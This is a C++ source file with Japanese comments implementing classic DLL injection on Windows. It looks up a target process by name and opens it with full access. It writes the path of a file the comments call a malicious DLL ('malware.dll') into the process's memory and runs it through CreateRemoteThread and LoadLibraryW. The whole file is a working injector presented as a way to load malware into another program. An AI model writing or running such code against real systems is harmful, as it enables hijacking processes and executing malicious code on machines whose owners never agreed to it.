#include <windows.h>
#include <tlhelp32.h>
#include <cstring>
#include <iostream>
#include <string>
#include <codecvt>
#include <locale>

// 悪意あるdllファイルのパス
const wchar_t* dllLibFullPath = L"malware.dll";

/*
 * 与えられたプロセス名（例：Notepad.exe）からPIDを取得する関数
 */
DWORD getProcessId(const wchar_t* processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W entry; // ワイド文字列版を使用
        entry.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnapshot, &entry)) { // ワイド文字列版の関数を使用
            do {
                if (!wcscmp(entry.szExeFile, processName)) {
                    processId = entry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &entry)); // ワイド文字列版の関数を使用
        }
        CloseHandle(hSnapshot);
    }
    return processId;
}

int main(int argc, char* argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <process name>" << std::endl;
    return 1;
  }
  
  // argv[1]をナロー文字列からワイド文字列へ変換
  std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
  std::wstring processName = converter.from_bytes(argv[1]);
  
  /*
   * STEP1)
   * プロセス全体からプロセス名が一致したプロセスのPIDを取得
   */
  DWORD processId = getProcessId(processName.c_str());
  if (processId == 0) {
    std::wcout << L"Process " << processName << L" not found." << std::endl;
    return 1;
  } else {
    std::wcout << L"Process ID of " << processName << L" is " << processId << L"." << std::endl;
  }
  
  /*
   * STEP2)
   * リモートプロセスをオープン
   */
  HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
  if (hProcess == 0) {
    std::wcerr << L"Failed to open process. Error code: " << GetLastError() << std::endl;
    return 1;
  }
  
  /*
   * STEP3)
   * ターゲットのリモートプロセス内にメモリを割りあて
   */
  LPVOID dllAllocatedMemory = VirtualAllocEx(
    hProcess,
    NULL,
    (wcslen(dllLibFullPath) + 1) * sizeof(wchar_t),
    MEM_RESERVE | MEM_COMMIT,
    PAGE_EXECUTE_READWRITE
  );
  if (dllAllocatedMemory == NULL) {
    std::wcerr << L"Failed to allocate memory in the target process. Error code: " << GetLastError() << std::endl;
    CloseHandle(hProcess);
    return 1;
  }
  
  /*
   * STEP4)
   * 割り当てたメモリに悪意あるdllを書き込み
   */
  BOOL memoryWritten = WriteProcessMemory(
    hProcess,
    dllAllocatedMemory,
    dllLibFullPath,
    (wcslen(dllLibFullPath) + 1) * sizeof(wchar_t),
    NULL
  );
  if (!memoryWritten) {
    std::wcerr << L"Failed to write memory in the target process. Error code: " << GetLastError() << std::endl;
    VirtualFreeEx(hProcess, dllAllocatedMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 1;
  }
  
  /*
   * STEP5)
   * リモートプロセス内のメモリに書き込んだ悪意あるdllを実行
   */
  LPVOID loadLibrary = (LPVOID) GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
  if (loadLibrary == NULL) {
    std::wcerr << L"Failed to get address of LoadLibraryW. Error code: " << GetLastError() << std::endl;
    VirtualFreeEx(hProcess, dllAllocatedMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 1;
  }

  // リモートプロセス内に新たにスレッドを作成し、悪意あるdllを実行
  HANDLE remoteThreadHandler = CreateRemoteThread(
	  hProcess,
	  NULL, 
	  0,
	  (LPTHREAD_START_ROUTINE) loadLibrary,
	  dllAllocatedMemory,
	  0,
	  NULL
  );
  if (remoteThreadHandler == NULL) {
    std::wcerr << L"Failed to create remote thread. Error code: " << GetLastError() << std::endl;
    VirtualFreeEx(hProcess, dllAllocatedMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 1;
  }
  
  // 後片付け
  std::wcout << L"Successfully injected the DLL." << std::endl;
  CloseHandle(remoteThreadHandler);
  CloseHandle(hProcess);
  
  return 0;
}